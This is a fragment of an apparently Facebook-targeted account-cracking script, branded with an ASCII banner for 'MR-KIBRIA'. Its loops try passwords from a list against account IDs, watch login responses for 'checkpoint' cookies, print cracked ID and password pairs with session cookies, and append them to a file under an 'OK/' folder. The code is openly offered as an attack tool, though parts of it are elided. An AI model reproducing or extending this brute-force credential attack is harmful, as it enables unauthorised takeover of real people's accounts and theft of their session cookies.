...
╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝
\033[0;94m╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗\033[1;33m 
╠══[Author                   • \33[1;38mMR-MR-KIBRIA😈 ]\33[1;38m     ║\033[1;31m 
╠══[Facebook                 • MR-KIBRIA ]   ║  \033[1;97m  
...
os.system('espeak -a 300 " Welcome,   to,  MR-KIBRIA,  King,  Tools"')
pass
    ...
    for pw in pwv:
        try:
            ...
            if "checkpoint" in po.cookies.get_dict().keys():
                print(f'\r\033[0;94m[MR-KIBRIA-Cp] {idf} • {pw}')
                ...
                print(f'\r\033[0;92m[MR-KIBRIA-Ok💚] {idf} • {pw}\n\033[0;93m[🌺]= COOKIES • \033[0;92m{kuki} ')
                os.system('espeak -a 300 " MR-KIBRIA,  Ok,  id"')
    ...
    for pw in pwv:
        try:
            ...
            if "checkpoint" in po.cookies.get_dict().keys():
                ...
                os.system('espeak -a 300 " Ok,  MR-KIBRIA,  id"')
                open('OK/'+okc,'a').write(idf+' • '+pw+'\n')
                break
